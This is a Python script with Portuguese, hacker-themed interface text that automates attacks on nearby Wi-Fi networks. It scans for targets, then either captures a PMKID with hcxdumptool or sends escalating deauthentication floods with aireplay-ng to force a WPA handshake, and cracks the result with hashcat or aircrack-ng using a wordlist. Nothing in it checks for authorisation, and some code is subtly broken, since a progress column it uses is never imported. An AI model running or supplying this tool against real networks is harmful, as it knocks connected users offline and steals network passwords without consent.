import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA DE PRÓXIMA GERAÇÃO (THEME HACKER/CYBERPUNK)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] O módulo 'rich' não foi encontrado. Execute ./run_auditor.sh para instalá-lo automaticamente.")
    exit(1)

console = Console()

def print_banner():
    banner = """
[bold cyan]██████╗ ███████╗██╗    ██╗    ██╗██╗███████╗██╗[/bold cyan]
[bold cyan]██╔══██╗██╔════╝██║    ██║    ██║██║██╔════╝██║[/bold cyan]
[bold blue]██║  ██║███████╗██║    ██║ █╗ ██║██║█████╗  ██║[/bold blue]
[bold blue]██║  ██║╚════██║██║    ██║███╗██║██║██╔══╝  ██║[/bold blue]
[bold magenta]██████╔╝███████║██║    ╚███╔███╔╝██║██║     ██║[/bold magenta]
[bold magenta]╚═════╝ ╚══════╝╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝[/bold magenta]
[bold white]       A U D I T O R I A   A V A N Ç A D A     [/bold white]
    """
    console.print(Panel(banner, title="[bold green]EXPERT SYSTEM ONLINE[/bold green]", border_style="cyan", padding=(1, 2)))

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo:
        command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e:
        return None, e.stderr.strip()

def check_aircrack_ng():
    with console.status("[bold yellow]Verificando integridade das ferramentas de ataque...", spinner="bouncingBar"):
        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools"]
        todas_instaladas = True
        
        for ferramenta in ferramentas:
            stdout, _ = run_command(f"dpkg -s {ferramenta}")
            if stdout and "install ok installed" in stdout:
                pass
            else:
                console.print(f"[bold red] [-] {ferramenta} ausente no sistema![/bold red]")
                todas_instaladas = False

    if todas_instaladas:
        console.print("[bold green] [✔] Arsenal de Hacking: Carregado e Operacional.[/bold green]")
        return True

    if Confirm.ask("[bold yellow]Dependências ausentes. Deseja iniciar a instalação militar agora?[/bold yellow]"):
        with console.status("[bold cyan]Baixando e instalando arsenal no núcleo do sistema...", spinner="dots2"):
            stdout, stderr = run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools", sudo=True)
            if stdout:
                 console.print("[bold green] [✔] Instalação concluída com êxito.[/bold green]")
                 return True
            else:
                 console.print(Panel(f"[bold red]Falha crítica na instalação:\n{stderr}[/bold red]", title="ERRO APT"))
                 return False
    else:
        console.print("[bold red] [X] Operação abortada por falta de ferramentas.[/bold red]")
        return False

def show_manual():
    manual_path = "manual_auditoria_wifi.md"
    if os.path.exists(manual_path):
        with open(manual_path, "r", encoding="utf-8") as f:
            content = f.read()
        console.print(Panel(content, title="[bold yellow]MANUAL TÉCNICO EXPERT[/bold yellow]", border_style="yellow", padding=(1, 2)))
    else:
        console.print("[bold red]Arquivo de manual não encontrado.[/bold red]")
    Prompt.ask("\n[bold cyan]Pressione ENTER para retornar à Base...[/bold cyan]")

def save_networks_log(networks):
    log_file = "redes_identificadas_log.json"
    data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_redes_encontradas": len(networks),
        "redes": networks
    }
    try:
        todas_sessoes = []
        if os.path.exists(log_file):
             with open(log_file, "r", encoding="utf-8") as f:
                  try:
                      todas_sessoes = json.load(f)
                      if not isinstance(todas_sessoes, list): todas_sessoes = [todas_sessoes]
                  except json.JSONDecodeError:
                      pass
        todas_sessoes.append(data)
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(todas_sessoes, f, indent=4, ensure_ascii=False)
    except Exception as e:
        pass # Falha silenciosa no log

def get_wifi_interface():
    with console.status("[bold cyan]Analisando hardware de rede...", spinner="point"):
        stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    
    if stdout:
        interfaces = stdout.split('\n')
        table = Table(title="[bold magenta]INTERFACES DE REDE DETECTADAS[/bold magenta]", show_header=True, header_style="bold cyan")
        table.add_column("ID", style="dim", width=4, justify="center")
        table.add_column("Nome da Interface", style="bold green", justify="left")
        
        for i, interface in enumerate(interfaces):
            table.add_row(str(i + 1), interface)
        
        console.print(table)
        
        choice = IntPrompt.ask("[bold yellow]Selecione a interface para injeção (ID)[/bold yellow]", choices=[str(i+1) for i in range(len(interfaces))])
        return interfaces[choice - 1]
    else:
        console.print("[bold red]Nenhuma interface Wi-Fi encontrada.[/bold red]")
        return None

def set_monitor_mode(interface):
    # Verificação inteligente: Se já estiver em modo monitor, não faz nada
    stdout_check, _ = run_command(f"iw dev {interface} info")
    if stdout_check and "type monitor" in stdout_check:
        console.print(f"[bold green] [✔] Interface {interface} já está em Modo Monitor. Pulando preparação.[/bold green]")
        return interface

    console.print(f"\n[bold yellow][PHD LEVEL][/bold yellow] Isolando kernel e armando a interface [bold cyan]{interface}[/bold cyan]...")
    with console.status("[bold red]Desativando bloqueios (rfkill) e processos conflitantes...", spinner="bouncingBar"):
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
        run_command("airmon-ng check kill", sudo=True)
        # Limpa interfaces virtuais antigas que podem estar presas
        run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)

    with console.status("[bold cyan]Injetando driver de Monitoramento...", spinner="bouncingBar"):
        stdout, stderr = run_command(f"airmon-ng start {interface}", sudo=True)
        stdout_iw, _ = run_command("iw dev")
        
    interfaces_monitor = []
    current_iface = None
    for line in stdout_iw.split('\n'):
        if "Interface" in line:
            current_iface = line.split()[1]
        elif "type monitor" in line and current_iface:
            interfaces_monitor.append(current_iface)
            current_iface = None

    if f"{interface}mon" in interfaces_monitor:
         console.print(f"[bold green] [✔] Interface armada no modo stealth: {interface}mon[/bold green]")
         return f"{interface}mon"
    elif interface in interfaces_monitor:
         console.print(f"[bold green] [✔] Interface armada no modo stealth: {interface}[/bold green]")
         return interface
    else:
         console.print("[bold red] [!] Anomalia detectada. Forçando injeção via API Baixo Nível (ip/iw)...[/bold red]")
         run_command(f"ip link set {interface} down", sudo=True)
         run_command(f"iw dev {interface} set type monitor", sudo=True)
         run_command(f"ip link set {interface} up", sudo=True)
         stdout_iw, _ = run_command(f"iw dev {interface} info")
         if stdout_iw and "type monitor" in stdout_iw:
             console.print(f"[bold green] [✔] Sucesso! Interface forçada para modo monitor: {interface}[/bold green]")
             return interface
         return None

def set_managed_mode(interface):
    console.print(f"\n[bold blue]>>> Restaurando o Sistema para Estado Civil...[/bold blue]")
    with console.status("[bold yellow]Desarmando placa e reiniciando serviços de rede críticos...", spinner="dots2"):
        # Garante a remoção do modo monitor
        run_command(f"airmon-ng stop {interface}", sudo=True)
        
        # Tenta resetar a interface via comandos de baixo nível para garantir
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"iw dev {interface} set type managed", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        
        # Reativa os bloqueios de rádio e os serviços na ordem correta
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl start wpa_supplicant", sudo=True)
        run_command("systemctl start NetworkManager", sudo=True)
        run_command("systemctl restart NetworkManager", sudo=True)
        
        # Força o NetworkManager a gerenciar as interfaces novamente
        run_command("nmcli networking off", sudo=True)
        time.sleep(1)
        run_command("nmcli networking on", sudo=True)
        
    console.print("[bold green] [✔] Interface devolvida ao modo gerenciado. Rede normal restabelecida.[/bold green]")

def scan_networks(monitor_interface):
    console.print(f"\n[bold magenta]>>> RADAR ATIVADO ({monitor_interface})[/bold magenta]")
    console.print("[bold cyan]Iniciando rastreamento de espectro Wi-Fi. Aperte [bold red]Ctrl+C[/bold red] para travar em um alvo.[/bold cyan]\n")
    
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")

    try:
        subprocess.run(f"sudo airodump-ng --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]>>> Rastreamento Finalizado.[/bold yellow]\n")

    csv_file = f"{output_prefix}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID":
                        in_ap_section = True
                        continue
                    if row[0].strip() == "Station MAC": break
                    
                    if in_ap_section:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        privacy = row[5].strip()
                        essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({'bssid': bssid, 'channel': channel, 'privacy': privacy, 'essid': essid})
        except Exception:
            pass

    if not networks:
        console.print("[bold red] Nenhuma rede detectada nas proximidades.[/bold red]")
        return None

    save_networks_log(networks)

    table = Table(title="[bold green]ALVOS POTENCIAIS RASTREADOS[/bold green]", show_lines=True)
    table.add_column("ID", justify="center", style="cyan", no_wrap=True)
    table.add_column("ESSID (Nome)", style="bold white")
    table.add_column("BSSID (MAC)", style="magenta")
    table.add_column("Canal", justify="center", style="yellow")
    table.add_column("Criptografia", justify="center", style="red")

    for i, net in enumerate(networks):
        table.add_row(str(i + 1), net['essid'], net['bssid'], net['channel'], net['privacy'])
    
    console.print(table)

    choice = IntPrompt.ask("\n[bold yellow]Fixar mira em qual alvo? (Digite o ID)[/bold yellow]", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    
    console.print(Panel(f"[bold cyan]Alvo Travado:[/bold cyan] {target['essid']} ({target['bssid']}) no Canal {target['channel']}", border_style="green"))
    
    console.print("\n[bold magenta]SELECIONE O VETOR DE ATAQUE DA OGIVA:[/bold magenta]")
    console.print("  [1] [bold cyan]Ataque Deauth (Handshake)[/bold cyan] - Clássico. Requer dispositivos conectados à rede para derrubar.")
    console.print("  [2] [bold red]Ataque PMKID (Clientless)[/bold red] - Expert. Ataca direto o núcleo do roteador. Não precisa de ninguém conectado.")
    atk_choice = Prompt.ask("[bold yellow]Estratégia (1 ou 2)[/bold yellow]", choices=["1", "2"], default="1")
    
    target['attack_type'] = 'pmkid' if atk_choice == '2' else 'handshake'
    return target

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold red]Iniciando Ataque PMKID Silencioso no alvo {bssid}...[/bold red]", border_style="red"))
    
    pcapng_file = f"{output_file}_pmkid.pcapng"
    hash_file = f"{output_file}_pmkid.16800"
    
    run_command(f"rm -f {pcapng_file} {hash_file}", sudo=True)
    run_command(f"ip link set {monitor_interface} down", sudo=True)
    run_command(f"iw dev {monitor_interface} set type monitor", sudo=True)
    run_command(f"ip link set {monitor_interface} up", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    filtro_file = "alvo_filtro.txt"
    with open(filtro_file, "w") as f: f.write(bssid.replace(":", "") + "\n")
        
    dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng_file} --filterlist_ap={filtro_file} --filtermode=2 --enable_status=1"
    
    with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
        task = progress.add_task("Bomba Lógica Enviada. Aguardando falha criptográfica do Roteador...", total=30)
        proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            progress.update(task, advance=1)
        proc.terminate()
        
    os.remove(filtro_file)

    console.print("\n[bold cyan]Analisando destroços criptográficos (Extração do Hash)...[/bold cyan]")
    if os.path.exists(pcapng_file):
        run_command(f"hcxpcapngtool -o {hash_file} {pcapng_file}")
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            console.print("[bold green] [✔] VITÓRIA PMKID! Hash extraído com sucesso da memória do Roteador.[/bold green]")
            return hash_file
        else:
            console.print("[bold red] [X] Roteador invulnerável a PMKID ou sinal fraco.[/bold red]")
            return None
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold yellow]Iniciando Ataque Deauth Adaptativo no alvo {bssid}...[/bold yellow]", border_style="yellow"))
    
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cap_file = f"{output_file}-01.cap"
    handshake_found = False
    
    for attempt in range(1, 4):
        console.print(f"\n[bold magenta]>>> ENGATILHANDO TENTATIVA {attempt}/3[/bold magenta]")
        
        if attempt == 1:
            deauth_cmd = f"sudo aireplay-ng -0 5 -a {bssid} {monitor_interface}"
            console.print("[cyan][*] Injetando 5 pacotes de desautenticação (Nível Baixo)...[/cyan]")
        elif attempt == 2:
            deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
            console.print("[cyan][*] Intensificando. Deauth Broadcast Massivo (Nível Médio)...[/cyan]")
        else:
            deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} -D {monitor_interface}"
            console.print("[bold red][*] FORÇA BRUTA MAC: Ignorando proteções, varredura destrutiva (Nível Máximo)...[/bold red]")

        subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        with Progress(SpinnerColumn("bouncingBar"), TextColumn("[bold yellow]Vigiando chaves criptográficas no ar... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
            task = progress.add_task("", total=20)
            for _ in range(20):
                time.sleep(1)
                progress.update(task, advance=1)
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                    stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                    if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout):
                        handshake_found = True
                        break
        
        if handshake_found:
            console.print(f"\n[bold green] [✔] HANDSHAKE CAPTURADO NA TENTATIVA {attempt}![/bold green]")
            break

    dump_proc.terminate()

    if handshake_found:
        return cap_file
    else:
        console.print("\n[bold red] [X] Todos os vetores de Deauth falharam. O alvo não liberou as chaves.[/bold red]")
        return None

def crack_hash(hash_file, wordlist_file, bssid=None):
    console.print(Panel(f"[bold red]CRACKING MODULE ATIVADO[/bold red]", border_style="red"))
    
    if not os.path.exists(wordlist_file):
        console.print(f"[bold red]Erro: O arsenal de senhas (Wordlist) '{wordlist_file}' não foi localizado no HD.[/bold red]")
        return

    if hash_file.endswith(".16800"):
        console.print("[bold cyan][Expert] Matriz PMKID reconhecida. Acionando Hashcat...[/bold cyan]")
        crack_cmd = f"hashcat -m 16800 -a 0 -w 3 {hash_file} {wordlist_file}"
        if run_command("which hashcat", capture_output=True)[0] == "":
            crack_cmd = f"aircrack-ng -w {wordlist_file} {hash_file}"
    else:
        crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
        
    console.print(f"[bold yellow]Comando balístico gerado:[/bold yellow] [dim]{crack_cmd}[/dim]")
    console.print("[bold green]Iniciando força bruta. Isso pode demorar dias, horas ou segundos...[/bold green]\n")
    
    try:
        subprocess.run(crack_cmd, shell=True)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]>>> Processo de Cracking Abortado Manualmente.[/bold yellow]")

def main():
    if os.geteuid() != 0:
        console.print(Panel("[bold red]ACESSO NEGADO: Este sistema de nível militar requer privilégios ROOT (sudo).[/bold red]"))
        return

    while True:
        os.system("clear")
        print_banner()
        console.print("\n[bold cyan]1.[/bold cyan] [white]Iniciar Incursão de Rede (Capturar/Quebrar)[/white]")
        console.print("[bold cyan]2.[/bold cyan] [white]Acessar Banco de Dados e Manuais (Info)[/white]")
        console.print("[bold cyan]3.[/bold cyan] [white]Desconectar Sistema (Sair)[/white]")
        
        opcao = Prompt.ask("\n[bold green]Comando de Ação[/bold green]", choices=["1", "2", "3"])
        
        if opcao == '2':
            show_manual()
            continue
        elif opcao == '3':
            console.print("[bold green]Sistemas encerrados. Conexão terminada.[/bold green]")
            return
        elif opcao == '1':
            break

    if not check_aircrack_ng():
        return

    interface = get_wifi_interface()
    if not interface: return

    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface: return

    try:
        target_network = scan_networks(monitor_interface)
        if not target_network: return

        capture_file_prefix = f"capture_{target_network['essid'].replace(' ', '_')}"
        cap_file = None
        
        if target_network['attack_type'] == 'pmkid':
             cap_file = capture_pmkid(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)
        else:
             cap_file_path = f"{capture_file_prefix}-01.cap"
             handshake_existente = False
             if os.path.exists(cap_file_path):
                 stdout, _ = run_command(f"aircrack-ng {cap_file_path}")
                 if "1 handshake" in stdout or "WPA (1 handshake)" in stdout:
                     if Confirm.ask(f"\n[bold yellow]Handshake válido já existe em disco para {target_network['essid']}. Usar versão salva?[/bold yellow]"):
                         handshake_existente = True
                         cap_file = cap_file_path

             if not handshake_existente:
                  cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)

        if not cap_file and target_network['attack_type'] == 'pmkid':
             console.print("\n[bold yellow][PHD LEVEL] Roteador evadiu o ataque PMKID. Acionando Plano B (Fallback para Handshake Clássico)...[/bold yellow]")
             cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)

        if not cap_file:
             console.print(Panel("[bold red]Operação Fracassada. O alvo resistiu aos vetores de ataque.[/bold red]"))
             return
             
        console.print(f"\n[bold green]>>> Chave Criptográfica retida em: {cap_file}[/bold green]")
        
        wordlist = Prompt.ask("\n[bold yellow]Caminho da Wordlist para quebra (Ex: /usr/share/wordlists/rockyou.txt, deixe em branco para pular)[/bold yellow]")
        if wordlist:
            crack_hash(cap_file, wordlist, target_network['bssid'])
        
    except KeyboardInterrupt:
        console.print("\n[bold red]>>> ABORTO DE EMERGÊNCIA SOLICITADO.[/bold red]")
    except Exception as e:
        console.print(f"\n[bold red][!] ERRO CRÍTICO: {e}[/bold red]")
    finally:
        set_managed_mode(monitor_interface)
        console.print("\n[bold green]>>> SISTEMA SEGURO. RETORNANDO AO TERMINAL.[/bold green]\n")

if __name__ == "__main__":
    main()
